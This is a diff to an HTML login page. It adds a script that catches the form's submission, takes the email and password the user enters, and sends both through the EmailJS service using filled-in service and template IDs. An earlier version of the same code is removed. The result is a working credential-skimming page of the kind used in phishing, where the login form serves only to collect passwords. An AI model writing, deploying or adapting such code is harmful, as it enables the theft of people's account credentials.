@@ -21,20 +21,30 @@
     </form>
     <p id="error-message" class="error-message"></p>
   </div>
-  <script src="script.js"></script> <!-- Link to JavaScript -->
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
-</body>
 
-  
-<script>
-  emailjs.init(template_f1yww2s);
-  document.getElementById('login-form').addEventListener('submit', (e) => {
-    e.preventDefault();
-    const password = document.getElementById('password').value;
-    const email = document.getElementById('email').value;
-    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', { password, email })
-      .then(() => alert('Email sent!'))
-      .catch((error) => console.error('Error sending email: ', error));
-  });
-</script>
+  <!-- Load EmailJS library -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+  <!-- Your custom script -->
+  <script>
+    // Initialize EmailJS with your User ID
+    emailjs.init('asuedukwt'); // Replace with your EmailJS User ID
+
+    // Handle form submission
+    document.getElementById('login-form').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const password = document.getElementById('password').value;
+      const email = document.getElementById('email').value;
+
+      // Send email using EmailJS
+      emailjs.send('service_ujhpjqw', 'template_igupmhn', { password, email })
+        .then(() => {
+          alert('Email sent!');
+        })
+        .catch((error) => {
+          console.error('Error sending email: ', error);
+          document.getElementById('error-message').textContent = 'Failed to send email. Please try again.';
+        });
+    });
+  </script>
+</body>
 </html>
